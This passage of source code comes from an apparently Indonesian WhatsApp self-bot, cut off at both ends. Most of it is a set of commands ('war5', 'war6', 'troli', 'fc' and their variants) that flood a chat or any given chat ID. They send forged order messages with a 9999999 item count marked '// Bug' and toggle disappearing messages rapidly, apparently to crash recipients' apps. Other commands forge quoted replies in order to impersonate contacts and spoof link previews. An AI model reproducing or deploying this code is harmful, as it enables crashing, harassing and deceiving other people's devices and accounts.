    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				break
				case 'war5':
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, 9999999)
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				break
				case 'war6':
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, 9999999)
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 9999999)
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				break
				case 'fc':
				await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(from, 9999999)
				break
				case 'troli':
				client.sendMessage(from, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				break
				case 'fc2':
				await client.toggleDisappearingMessages(q, WA_DEFAULT_EPHEMERAL)
				await client.toggleDisappearingMessages(q, 99999)
				break
				case 'troli2':
				client.sendMessage(q, myteks, MessageType.extendedText, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   					    		itemCount: 9999999, // Bug
    							status: 1,
    							surface: 1,
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
				break
				case 'setmyteks':
				myteks = body.slice(11)
				break
case 'say':
sey = body.slice(5)
faketroli(sey)
break
case 'say2':
			client.sendMessage(q, myteks, text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
break
				case 'hidetag':
					var value = body.slice(9)
					var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map(async adm => {
						mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var optionshidetag = {
						text: value,
						contextInfo: { mentionedJid: mem },
						quoted: mek
					}
			client.sendMessage(from, optionshidetag, text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					break
				case 'hack':
					var nn = body.slice(6)
					var urlnye = nn.split("|")[0];
					var canonnye = nn.split("|")[1];
					var titlenye = nn.split("|")[2];
					var descnye = nn.split("|")[3];
					imgbbb = require('imgbb-uploader')
					run = getRandom('.jpeg')
					encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi, ''))

					client.sendMessage(from, {

						text: `${urlnye}`,

						matchedText: `${urlnye}`,

						canonicalUrl: `${canonnye}`,

						description: `${descnye}`,

						title: `${titlenye}`,

						jpegThumbnail: ddatae
					}, 'extendedTextMessage', { detectLinks: false })
					break
				case 'slowmo':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return faketroli(`Error: ${err}`)
						hah = fs.readFileSync(ran)
			client.sendMessage(from, hah, audio, {
				mimetype: 'audio/mp4',
				ptt: true,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
						fs.unlinkSync(ran)
					})
					break
				case 'setname':
					kuy = body.slice(9)
					if (!kuy) return faketroli(wrongFormat)
					await client.updateProfileName(kuy)
					faketroli(`Success ganti nama menjadi ${kuy}`)
					break
				case 'setpp':
					client.updatePresence(from, Presence.composing)
					if (!isQuotedImage) return faketroli(mess.wrongFormat)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
					await client.updateProfilePicture(botNumber, media)
					faketroli('Success Mengganti Poto Profile')
					break
				case 'tovideo':
					if (!isQuotedSticker) return faketroli(mess.wrongFormat)
					faketroli(mess.wait)
					anumedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					anum = await client.downloadAndSaveMediaMessage(anumedia)
					ran = getRandom('.webp')
					exec(`ffmpeg -i ${anum} ${ran}`, (err) => {
						fs.unlinkSync(anum)
						if (err) return faketroli(`Error: ${err}`)
						buffers = fs.readFileSync(ran)
			client.sendMessage(from, buffers, video, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
						fs.unlinkSync(ran)
					})
					break
				case 'grup':
					if (!isGroup) return faketroli(mess.only.group)
					if (!isBotGroupAdmins) return faketroli(mess.only.Badmin)
					if (args[0] === 'buka') {
						client.groupSettingChange(from, GroupSettingChange.messageSend, false)
						await sleep(2000)
						faketroli(`*SUKSES BUKA GRUP*`)
					} else if (args[0] === 'tutup') {
						await client.groupSettingChange(from, GroupSettingChange.messageSend, true)
						await sleep(2000)
						faketroli(`*SUKSES TUTUP GRUP*`)
					}
					break
				case 'gcname':
					kuy = body.slice(8)
					if (!kuy) return faketroli(mess.wrongFormat)
					if (!isBotGroupAdmins) return faketroli(mess.only.Badmin)
					await client.groupUpdateSubject(from, `${kuy}`)
					await sleep(2000)
					faketroli(`*Success ganti nama grup ke ${kuy}*`)
					break
				case 'gcdesk':
					kuy = body.slice(8)
					if (!kuy) return faketroli(mess.wrongFormat)
					if (!isBotGroupAdmins) return faketroli(mess.only.Badmin)
					await client.groupUpdateDescription(from, `${kuy}`)
					await sleep(2000)
					faketroli(`*Success ganti deskripsi grup ke ${kuy}*`)
					break
				case 'runtime':
					runtime = process.uptime()
					teks = `${kyun(runtime)}`
					faketroli(teks)
					break
				case 'play':
					queryplay = body.slice(6)
					if (!queryplay) return faketroli(mess.wrongFormat)
					lerrr = await axios.get(`https://api.xteam.xyz/dl/play?lagu=${encodeURIComponent(queryplay)}&APIKEY=ShellysChan`)
					var { judul, size, thumbnail, source, url } = lerrr.data
					gbr = await getBuffer(lerrr.data.thumbnail)
					faketroli(mess.wait)
					client.sendMessage(from, thumb, image, { quoted: mek, caption: teks })
			client.sendMessage(from, gbr, image, {
				caption: `*${judul}*\n\nUkuran : ${size}\nSumber : ${source}\nThumbnail : ${thumbnail}\nDownload : ${url}`,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					bufferss = await getBuffer(lerrr.data.url)
			client.sendMessage(from, buffers, audio, {
				mimetype: 'audio/mp4',
				filename: `MFarelSZ.mp3`,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					break
				/*case 'ytmp3':
					if (!q) return fakegroup(mess.wrongFormat)
					fetchytmp3 = await fetchJson(`https://api.vhtear.com/ytdl?link=${body.slice(7)}&apikey=${config.VhtearKey}`, { method: 'get' })
					_ytmp3 = fetchytmp3.result
					resultytmp3 = `*「 Youtube MP3 」*\n\n• Judul: ${_ytmp3.title}\n• Ext: Mp3\n• Size: ${_ytmp3.size}\n\n_SELF-BOT_`
					thumbytmp3 = await getBuffer(_ytmp3.imgUrl)
					fakegroup(mess.wait)
					client.sendMessage(from, thumbytmp3, image, { quoted: mek, caption: resultytmp3 })
					buffytmp3 = await getBuffer(_ytmp3.UrlMp3)
					client.sendMessage(from, buffytmp3, audio, { mimetype: 'audio/mp4', filename: `${_ytmp3.title}.mp3`, quoted: mek })
					break
				case 'pinterest':
					if (!q) return fakegroup(mess.wrongFormat)
					data = await fetchJson(`https://api.vhtear.com/pinterest?query=${q}&apikey=${config.VhtearKey}`, { method: 'get' })
					if (data.error) return reply(data.error)
					for (let xyz of data.result) {
						const amsulah = data.result
						const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
						thumb = await getBuffer(pimterest)
					}
					fakegroup(mess.wait)
					client.sendMessage(from, thumb, image, { quoted: mek, caption: `- Pinterest : ` + papapale })
					break*/
				case 'truth':
					const randomtruth = truth[Math.floor(Math.random() * truth.length)]
					truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
			client.sendMessage(from, truteh, image, {
				caption: '*Truth*\n\n• ' + randomtruth,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
					break
				case 'cr1':
					var split = args.join(' ').replace(/@|\d/gi, '').split('|')
					var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					const target = {
						contextInfo: {
							participant: taged,
							quotedMessage: {
								extendedTextMessage: {
									text: split[0]
								}
							}
						}
					}
					client.sendMessage(from, `${split[1]}`, MessageType.text, target)
					break
				case 'settarget':
					kuy = body.slice(11)
					targetprivate = kuy
					faketroli(`Succes Mengganti target Private Fake Reply : ${targetprivate}`)
					break
				case 'cr2':
					jids = `${targetprivate}@s.whatsapp.net` // nomer target
					var split = args.join(' ').replace(/@|\d/gi, '').split('|')
					var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					const options = {
						contextInfo: {
							quotedMessage: {
								extendedTextMessage: {
									text: split[0]
								}
							}
						}
					}
					const responye = await client.sendMessage(jids, `${split[1]}`, MessageType.text, options)
					await client.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
					break
				case 'antidelete':
					const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
					const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
					const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
					const isRevoke = dataRevoke.includes(from)
					const isCtRevoke = dataCtRevoke.data
					const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false
					const argz = body.split(' ')
					if (argz.length === 1) return faketroli(`Penggunaan Fitur Anti Delete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)
					if (argz[1] == 'aktif') {
						if (isGroup) {
							if (isRevoke) return faketroli(`Antidelete Telah Diaktifkan Di Grup Ini Sebelumnya!`)
							dataRevoke.push(from)
							fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
							faketroli(`Antidelete Diaktifkan Di Grup Ini!`)
						} else if (!isGroup) {
							faketroli(`Untuk kontak penggunaan *${prefix}antidelete ctaktif*`)
						}
					} else if (argz[1] == 'ctaktif') {
						if (!isGroup) {
							if (isCtRevoke) return faketroli(`Antidelete telah diaktifkan di semua kontak sebelumnya!`)
							dataCtRevoke.data = true
							fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
							faketroli(`Antidelete diaktifkan disemua kontak!`)
						} else if (isGroup) {
							faketroli(`Untuk grup penggunaan *${prefix}antidelete aktif*`)
						}
					} else if (argz[1] == 'banct') {
						if (isBanCtRevoke) return faketroli(`kontak ini telah ada di database banlist!`)
						if (argz.length === 2 || argz[2].startsWith('0')) return faketroli(`Masukan nomer diawali dengan 62! contoh 62859289xxxxx`)
						dataBanCtRevoke.push(argz[2] + '@s.whatsapp.net')
						fs.writeFileSync('./src/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
						faketroli(`Kontak ${argz[2]} telah dimasukan ke banlist antidelete secara permanen!`)
					} else if (argz[1] == 'mati') {
						if (isGroup) {
							const index = dataRevoke.indexOf(from)
							dataRevoke.splice(index, 1)
							fs.writeFileSync('./src/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
							faketroli(`Antidelete dimatikan di grup ini!`)
						} else if (!isGroup) {
							faketroli(`Untuk kontak penggunaan *${prefix}antidelete ctmati*`)
						}
					} else if (argz[1] == 'ctmati') {
						if (!isGroup) {
							dataCtRevoke.data = false
							fs.writeFileSync('./src/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
							faketroli(`Antidelete dimatikan disemua kontak!`)
						} else if (isGroup) {
							faketroli(`Untuk grup penggunaan *${prefix}antidelete mati*`)
						}
					}
					break
				case 'linkgc':
					if (!isGroup) return faketroli(mess.only.group)
					if (!isBotGroupAdmins) return faketroli(mess.only.Badmin)
					const linkgc = await client.groupInviteCode(from)
					faketroli(`https://chat.whatsapp.com/${linkgc}`)
					break
				/*case 'ytstalk':
					if (!q) return fakegroup(mess.wrongFormat)
					try {
						const channel = await fetchs.get(`https://www.googleapis.com/youtube/v3/search?part=snippet&q=${q}&key=${config.YoutubeKey}&maxResults=1&type=channel`);
						const resultchannel = await fetchs.get(`https://www.googleapis.com/youtube/v3/channels?part=snippet,contentDetails,statistics,brandingSettings&id=${channel.body.items[0].id.channelId}&key=${config.YoutubeKey}`);
						const datachannel = `「 *YOUTUBE-STALK* 」

• *CHANNEL* : ${channel.body.items[0].snippet.channelTitle}
• *DESKRIPSI* : ${channel.body.items[0].snippet.description}
• *TOTAL SUBS* : ${convertBalanceToString(resultchannel.body.items[0].statistics.subscriberCount)}
• *TOTAL VIEW* : ${convertBalanceToString(resultchannel.body.items[0].statistics.viewCount)}
• *TOTAL VIDEO* : ${convertBalanceToString(resultchannel.body.items[0].statistics.videoCount)}
• *DATA CREATED* : ${channel.body.items[0].snippet.publishedAt}
• *LINK* : https://www.youtube.com/channel/${channel.body.items[0].id.channelId}
`
						fakegroup(mess.wait)
						var buffer321 = await getBuffer(`${channel.body.items[0].snippet.thumbnails.high.url}`)
						client.sendMessage(from, buffer321, MessageType.image, { caption: datachannel, quoted: mek })
					} catch (err) {
						fakegroup(`Err: ${err}`)
					}
					break
				case 'tahta':
					if (!q) return fakegroup(mess.wrongFormat)
					var buffer213 = await getBuffer(`https://api.vhtear.com/hartatahta?text=${q}&apikey=${config.VhtearKey}`)
					fakegroup(mess.wait)
					client.sendMessage(from, buffer213, MessageType.image, { quoted: mek, caption: `*HARTA TAHTA ${q}*` })
					break
				case 'otakulast':
					anu = await fetchJson(`https://api.vhtear.com/otakulatest&apikey=${config.VhtearKey}`, { method: 'get' })
					if (anu.error) return fakegroup(anu.error)
					teks = '「 *OTAKULAST* 」\n\n'
					for (let i of anu.result.data) {
						teks += `${i}\n• Title : ${i.title}\n• Link : ${i.link}\n• Published : ${i.datetime}\n`
					}
					fakegroup(teks.trim())
					break*/
				case 'dork':
					if (!q) return faketroli(mess.wrongFormat)
					try {
						faketroli(mess.wait)
						anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/dorking?dork=${q}`, { method: 'get' })
						hasil = `${anu.result}`
						faketroli(hasil)
					} catch (err) {
						faketroli(`Error: ${err}`)
					}
					break
				case 'findhost':
					try {
						if (!q) return faketroli(mess.wrongFormat)
						anu = await fetchJson(`https://api.banghasan.com/domain/hostsearch/${q}`, { method: 'get' })
						faketroli(anu.hasil)
					} catch (err) {
						faketroli(`Error: ${err}`)
					}
					break
				case 'menu':
				case 'help':
					runtime = process.uptime()
					teks = `${kyun(runtime)}`
					menunye = `「 *MFarelSZ-SELF* 」

• ${prefix}fc
• ${prefix}troli
• ${prefix}fc2 <id chat>
• ${prefix}troli2 <id chat>
• ${prefix}say <teks>
• ${prefix}hidetag <teks>
• ${prefix}hack <url|canonical|judul|desk>
• ${prefix}slowmo <reply audio>
• ${prefix}setname <teks>
• ${prefix}setpp <reply gambar>
• ${prefix}tovideo <reply sticker gif>
• ${prefix}grup <buka/tutup>
• ${prefix}gcname <teks>
• ${prefix}gcdesk <teks>
• ${prefix}runtime
• ${prefix}play <teks>
• ${prefix}truth
• ${prefix}cr1 <@tag textdia|textmu>
• ${prefix}settarget <nomor>
• ${prefix}cr2 <@tagsiapapun textdia|textmu>
• ${prefix}antidelete <ct/aktif/mati>
• ${prefix}linkgc
• ${prefix}dork <teks>
• ${prefix}findhost <teks>
• ${prefix}tupai <reply audio>
• ${prefix}toptt <reply audio>
• ${prefix}bass <reply audio>
• ${prefix}trigger <reply gambar>
• ${prefix}wasted <reply gambar>
• ${prefix}upswteks <text|bg|bgtext|font>
• ${prefix}upswgambar <text>
• ${prefix}upswvideo <text>
• ${prefix}> <eval>
• ${prefix}tomp3 <reply video>
• ${prefix}getsticker <nama>
• ${prefix}getvideo <nama>
• ${prefix}getvn <nama>
• ${prefix}getimage <nama>
• ${prefix}addsticker <nama>
• ${prefix}addvideo <nama>
• ${prefix}addvn <nama>
• ${prefix}addimage <nama>
• ${prefix}delsticker <nama>
• ${prefix}delvideo <nama>
• ${prefix}delvn <nama>
• ${prefix}delimage <nama>
• ${prefix}stickerlist
• ${prefix}videolist
• ${prefix}vnlist
• ${prefix}imagelist
• ${prefix}setthumb <reply gambar>
• ${prefix}leave
• ${prefix}cekchat
• ${prefix}ping
• ${prefix}term <eval2>
• ${prefix}nmap <eval3>
• ${prefix}donate
• ${prefix}blocklist
• ${prefix}sticker
• ${prefix}tts <kode bahasa> <teks>
• ${prefix}setprefix <teks>
• ${prefix}setfake <teks>
• ${prefix}setnomor <nomor>
• ${prefix}dare
• ${prefix}readallchat
• ${prefix}clearall
• ${prefix}listadmin
• ${prefix}toimg <reply sticker>
• ${prefix}afk <enable/disable>
• ${prefix}afktag <enable/disable>

「 *MFarelSZ-SELF* 」`
					faketroli(menunye)
					break
				case 'tupai':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return faketroli(`Error: ${err}`)
						hah = fs.readFileSync(ran)
			client.sendMessage(from, hah, audio, {
				mimetype: 'audio/mp4',
				ptt: true,
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6281219087237-1620254146@g.us" } : {})
					},
					message: {
   							orderMessage: {
   								thumbnail: fs.readFileSync('./src/image/MFarelSZ.jpeg'),
    							message: fake,
    							orderTitle: 'MFarelSZ.xyz',
    							sellerJid: '0@s.whatsapp.net'
   							  }
					}
				}
			})
						fs.unlinkSync(ran)
					})
					break
				case 'toptt':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return faketroli(`Error: ${err}`)
						topt = fs.readFileSync(ran)
			client.sendMessage(from, topt, audio, {
				mimetype: 'audio/mp4',
